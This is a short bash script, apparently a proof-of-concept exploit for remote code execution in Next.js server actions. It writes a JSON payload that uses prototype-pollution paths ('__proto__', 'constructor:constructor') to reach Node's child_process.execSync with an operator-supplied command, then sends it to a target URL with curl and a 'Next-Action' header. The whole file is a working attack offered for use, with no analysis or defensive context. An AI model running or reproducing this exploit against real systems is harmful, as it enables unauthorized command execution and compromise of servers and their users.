#!/bin/bash


target=$1
command=$2

cat > payload.json <<EOF
{
    "then": "\$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": "{\\"then\\": \\"\$B0\\"}",
    "_response": {
        "_prefix": "process.mainModule.require('child_process').execSync('${command}');",
        "_formData": {
            "get": "\$1:constructor:constructor"
        }
    }
}
EOF

echo -n '"$@0"' > payload2.txt

curl -X POST $target -H "Next-Action: dontcare" \
    -F "0=<payload.json" -F '1=<payload2.txt' \
    --max-time 2 2>/dev/null || true
